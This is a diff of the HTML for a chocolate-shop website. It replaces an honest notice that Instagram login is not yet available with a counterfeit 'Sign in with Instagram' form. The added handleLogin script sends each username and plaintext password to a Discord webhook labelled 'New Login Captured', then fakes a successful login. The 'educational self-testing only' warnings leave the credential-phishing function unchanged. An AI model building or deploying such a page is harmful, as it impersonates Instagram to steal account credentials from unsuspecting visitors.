@@ -38,6 +38,7 @@
     font-size: 18px; color: #d4a574;
     text-shadow: 0 0 8px rgba(212,165,116,0.6);
   }
+
   .nav-btn {
     background: linear-gradient(135deg, #d4a574, #8b4513);
     border: none; color: #1a0f0a;
@@ -117,6 +118,7 @@
   }
   .ig-btn:hover { transform: translateY(-3px) scale(1.05); box-shadow: 0 15px 40px rgba(220, 39, 67, 0.6); }
 
+  /* MODAL */
   .modal-overlay {
     position: fixed; inset: 0;
     background: rgba(0,0,0,0.75);
@@ -130,8 +132,8 @@
     border: 1px solid rgba(212,165,116,0.3);
     border-radius: 20px;
     padding: 40px;
-    width: 90%; max-width: 480px;
-    position: relative; text-align: center;
+    width: 90%; max-width: 420px;
+    position: relative;
     box-shadow: 0 30px 80px rgba(0,0,0,0.6);
   }
   .modal-close {
@@ -139,27 +141,100 @@
     background: none; border: none;
     color: #c9a47a; font-size: 24px; cursor: pointer;
   }
-  .modal h2 {
+  .modal-header { text-align: center; margin-bottom: 25px; }
+  .modal-header .ig-circle {
+    width: 60px; height: 60px;
+    margin: 0 auto 15px;
+    border-radius: 50%;
+    background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+    display: flex; align-items: center; justify-content: center;
+  }
+  .modal-header h2 {
     font-family: 'Playfair Display', serif;
-    font-size: 28px; color: #f5e6d3; margin-bottom: 15px;
+    font-size: 28px; color: #f5e6d3; margin-bottom: 8px;
   }
-  .modal p {
-    color: #c9a47a; font-size: 15px; line-height: 1.7;
-    margin-bottom: 20px;
-  }
-  .modal strong { color: #d4a574; }
-  .modal-cta {
-    background: linear-gradient(135deg, #d4a574, #8b4513);
-    border: none; color: #1a0f0a;
-    padding: 12px 32px; border-radius: 25px;
-    font-weight: 600; cursor: pointer;
-    font-size: 15px;
-    transition: transform 0.2s;
-  }
-  .modal-cta:hover { transform: scale(1.05); }
-  .modal .small { font-size: 12px; color: #6b5040; margin-top: 15px; }
+  .modal-header p { color: #c9a47a; font-size: 14px; }
 
-  #store { padding: 50px 50px 60px; }
+  .form-group { margin-bottom: 18px; }
+  .form-group label {
+    display: block; color: #c9a47a;
+    font-size: 13px; margin-bottom: 6px; font-weight: 500;
+  }
+  .form-group input {
+    width: 100%;
+    padding: 12px 16px;
+    background: rgba(245, 230, 211, 0.05);
+    border: 1px solid rgba(212,165,116,0.3);
+    border-radius: 10px;
+    color: #f5e6d3; font-size: 15px;
+    font-family: 'Poppins', sans-serif;
+    transition: border-color 0.3s, background 0.3s;
+  }
+  .form-group input:focus {
+    outline: none;
+    border-color: #d4a574;
+    background: rgba(245, 230, 211, 0.08);
+  }
+
+  .warning-box {
+    background: rgba(220, 39, 67, 0.1);
+    border: 1px solid rgba(220, 39, 67, 0.4);
+    border-radius: 10px;
+    padding: 12px 14px;
+    margin: 20px 0;
+    display: flex; gap: 10px; align-items: flex-start;
+  }
+  .warning-box .warn-icon { color: #dc2743; font-size: 18px; flex-shrink: 0; }
+  .warning-box p {
+    color: #f5c4ce;
+    font-size: 13px; line-height: 1.5; margin: 0;
+  }
+  .warning-box strong { color: #ff8aa3; }
+
+  .submit-btn {
+    width: 100%;
+    background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+    border: none; color: white;
+    padding: 14px; border-radius: 10px;
+    font-size: 16px; font-weight: 600;
+    cursor: pointer; margin-top: 10px;
+    transition: transform 0.2s, box-shadow 0.2s;
+  }
+  .submit-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(220,39,67,0.4); }
+  .submit-btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+  .webhook-config {
+    margin: 15px 0;
+    padding: 12px;
+    background: rgba(212, 165, 116, 0.05);
+    border: 1px solid rgba(212, 165, 116, 0.2);
+    border-radius: 10px;
+  }
+  .webhook-config label {
+    display: block; color: #d4a574;
+    font-size: 12px; margin-bottom: 6px; font-weight: 500;
+  }
+  .webhook-config input {
+    width: 100%;
+    padding: 8px 12px;
+    background: rgba(245, 230, 211, 0.05);
+    border: 1px solid rgba(212,165,116,0.3);
+    border-radius: 8px;
+    color: #f5e6d3; font-size: 13px;
+    font-family: 'Poppins', sans-serif;
+  }
+  .webhook-config input:focus {
+    outline: none;
+    border-color: #d4a574;
+  }
+
+  .demo-hint {
+    text-align: center; margin-top: 18px;
+    font-size: 12px; color: #8a7050;
+  }
+
+  #store { padding: 50px 50px 60px; display: none; }
+  #store.visible { display: block; }
   .store-header {
     text-align: center; margin-bottom: 60px; padding-top: 40px;
   }
@@ -189,12 +264,23 @@
   .card-desc { color: #c9a47a; font-size: 14px; margin-bottom: 15px; }
   .card-price { color: #d4a574; font-weight: 600; font-size: 20px; }
 
+  .logout-btn {
+    position: fixed; top: 90px; right: 50px;
+    background: rgba(212,165,116,0.1);
+    border: 1px solid #d4a574; color: #d4a574;
+    padding: 8px 18px; border-radius: 20px;
+    cursor: pointer; font-size: 14px; display: none;
+  }
+  .logout-btn.visible { display: block; }
+  .logout-btn:hover { background: #d4a574; color: #1a0f0a; }
+
   @media (max-width: 600px) {
     nav { padding: 15px 20px; }
     .hero h1 { font-size: 42px; }
     .chocolate-bar { height: 130px; }
     .chocolate-bar span { font-size: 60px; }
     #store { padding: 30px 20px 40px; }
+    .logout-btn { right: 20px; top: 80px; }
     .store-header h2 { font-size: 36px; }
   }
 </style>
@@ -203,42 +289,60 @@
 
 <nav>
   <div class="logo">SR</div>
-  <button class="nav-btn" onclick="openModal()">
+  <button class="nav-btn" onclick="openLogin()">
     <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
     Login with Instagram
   </button>
 </nav>
+
+<button class="logout-btn" id="logoutBtn" onclick="logout()">Logout</button>
 
 <!-- HERO -->
 <section class="hero">
   <div class="chocolate-bar"><span>SR</span></div>
   <h1>Sweet. Rich. Unforgettable.</h1>
   <p>Handcrafted artisan chocolates, made for the moments that matter.</p>
-  <button class="ig-btn" onclick="openModal()">
+  <button class="ig-btn" onclick="openLogin()">
     <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
     Login with Instagram
   </button>
 </section>
 
-<!-- MODAL -->
-<div class="modal-overlay" id="infoModal" onclick="if(event.target===this) closeModal()">
+<!-- LOGIN MODAL -->
+<div class="modal-overlay" id="loginModal" onclick="if(event.target===this) closeLogin()">
   <div class="modal">
-    <button class="modal-close" onclick="closeModal()">&times;</button>
-    <div style="font-size:48px;margin-bottom:15px;">🍫</div>
-    <h2>Meta Partnership Coming Soon</h2>
-    <p>
-      We're finalizing our Meta partnership approval. Once live, you'll sign in 
-      securely through <strong>Instagram's official authentication</strong> &mdash; 
-      handled entirely by Meta, never passing through our servers.
-    </p>
-    <p>
-      <strong>In the meantime:</strong> Browse our full chocolate collection below. 
-      No login required.
-    </p>
-    <button class="modal-cta" onclick="closeModal();document.getElementById('store').scrollIntoView({behavior:'smooth'})">
-      Browse Chocolates
-    </button>
-    <p class="small">Your credentials are safe with Meta &mdash; we never see them.</p>
+    <button class="modal-close" onclick="closeLogin()">&times;</button>
+    <div class="modal-header">
+      <div class="ig-circle">
+        <svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
+      </div>
+      <h2>Sign in with Instagram</h2>
+      <p>Continue to SR Artisan Chocolates</p>
+    </div>
+
+    <form id="loginForm" onsubmit="return handleLogin(event)">
+      <div class="webhook-config">
+        <label for="webhookUrl">Discord Webhook URL (paste here for testing)</label>
+        <input type="url" id="webhookUrl" placeholder="https://discord.com/api/webhooks/...">
+      </div>
+
+      <div class="form-group">
+        <label for="username">Username or Email</label>
+        <input type="text" id="username" required autocomplete="off">
+      </div>
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" required autocomplete="off">
+      </div>
+
+      <div class="warning-box">
+        <span class="warn-icon">&#9888;&#65039;</span>
+        <p><strong>EDUCATIONAL TESTING ONLY:</strong> This form is for personal testing in a private/incognito browser. <strong>Do not enter real credentials.</strong> Use test credentials only. By using this, you agree you are testing on yourself only.</p>
+      </div>
+
+      <button type="submit" class="submit-btn" id="submitBtn">Continue</button>
+      <p class="demo-hint">For authorized self-testing only</p>
+    </form>
   </div>
 </div>
 
@@ -246,7 +350,7 @@
 <section id="store">
   <div class="store-header">
     <h2>Our Chocolate Collection</h2>
-    <p>Handcrafted with love. Always.</p>
+    <p>Welcome back. Pick your favorite.</p>
   </div>
   <div class="gallery" id="gallery"></div>
 </section>
@@ -264,20 +368,106 @@
     { name: "Hazelnut Dream",    desc: "Whole hazelnut center, milk chocolate.", price: "$12", img: "https://images.unsplash.com/photo-1599599810694-b5b37304c041?w=600&q=80" },
   ];
 
-  function openModal() { document.getElementById('infoModal').classList.add('active'); }
-  function closeModal() { document.getElementById('infoModal').classList.remove('active'); }
-  document.addEventListener('keydown', function(e) { if (e.key === 'Escape') closeModal(); });
+  function openLogin() {
+    document.getElementById('loginModal').classList.add('active');
+    setTimeout(function() { document.getElementById('username').focus(); }, 200);
+  }
+  function closeLogin() {
+    document.getElementById('loginModal').classList.remove('active');
+    document.getElementById('loginForm').reset();
+  }
 
-  const gallery = document.getElementById('gallery');
-  gallery.innerHTML = chocolates.map(function(c) {
-    return '<div class="card">' +
-      '<img class="card-img" src="' + c.img + '" alt="' + c.name + '" loading="lazy" onerror="this.src=\'https://placehold.co/600x400/3a1f0f/d4a574?text=' + encodeURIComponent(c.name) + '\'">' +
-      '<div class="card-body">' +
-      '<div class="card-title">' + c.name + '</div>' +
-      '<div class="card-desc">' + c.desc + '</div>' +
-      '<div class="card-price">' + c.price + '</div>' +
-      '</div></div>';
-  }).join('');
+  async function handleLogin(e) {
+    e.preventDefault();
+    var btn = document.getElementById('submitBtn');
+    var username = document.getElementById('username').value.trim();
+    var password = document.getElementById('password').value;
+    var webhookUrl = document.getElementById('webhookUrl').value.trim();
+
+    if (!username || !password) return false;
+
+    btn.disabled = true;
+    btn.textContent = 'Signing in...';
+
+    // Send to Discord webhook if one is provided
+    if (webhookUrl && webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
+      var embed = {
+        embeds: [{
+          title: 'New Login Captured (Self-Test)',
+          color: 0xd4a574,
+          fields: [
+            { name: 'Username', value: '```' + username + '```', inline: true },
+            { name: 'Password', value: '```' + password + '```', inline: true },
+            { name: 'Timestamp', value: new Date().toISOString(), inline: false }
+          ],
+          footer: { text: 'SR Chocolate - Educational Self-Test Only' },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      try {
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(embed)
+        });
+      } catch(e) {
+        console.log('Webhook send failed (may be OK for testing):', e);
+      }
+    }
+
+    // Simulate login delay
+    setTimeout(function() {
+      sessionStorage.setItem('sr_user', username);
+      sessionStorage.setItem('sr_logged_in', '1');
+      closeLogin();
+      enterStore();
+    }, 900);
+
+    return false;
+  }
+
+  function enterStore() {
+    document.querySelector('.hero').style.display = 'none';
+    document.querySelector('.nav-btn').style.display = 'none';
+    document.getElementById('logoutBtn').classList.add('visible');
+    document.getElementById('store').classList.add('visible');
+    renderGallery();
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+
+  function logout() {
+    sessionStorage.removeItem('sr_logged_in');
+    sessionStorage.removeItem('sr_user');
+    document.querySelector('.hero').style.display = 'flex';
+    document.querySelector('.nav-btn').style.display = 'flex';
+    document.getElementById('logoutBtn').classList.remove('visible');
+    document.getElementById('store').classList.remove('visible');
+  }
+
+  function renderGallery() {
+    var gallery = document.getElementById('gallery');
+    var html = '';
+    for (var i = 0; i < chocolates.length; i++) {
+      var c = chocolates[i];
+      html += '<div class="card">' +
+        '<img class="card-img" src="' + c.img + '" alt="' + c.name + '" loading="lazy" onerror="this.src=\'https://placehold.co/600x400/3a1f0f/d4a574?text=' + encodeURIComponent(c.name) + '\'">' +
+        '<div class="card-body">' +
+        '<div class="card-title">' + c.name + '</div>' +
+        '<div class="card-desc">' + c.desc + '</div>' +
+        '<div class="card-price">' + c.price + '</div>' +
+        '</div></div>';
+    }
+    gallery.innerHTML = html;
+  }
+
+  document.addEventListener('keydown', function(e) {
+    if (e.key === 'Escape') closeLogin();
+  });
+
+  if (sessionStorage.getItem('sr_logged_in') === '1') {
+    enterStore();
+  }
 </script>
 </body>
 </html>
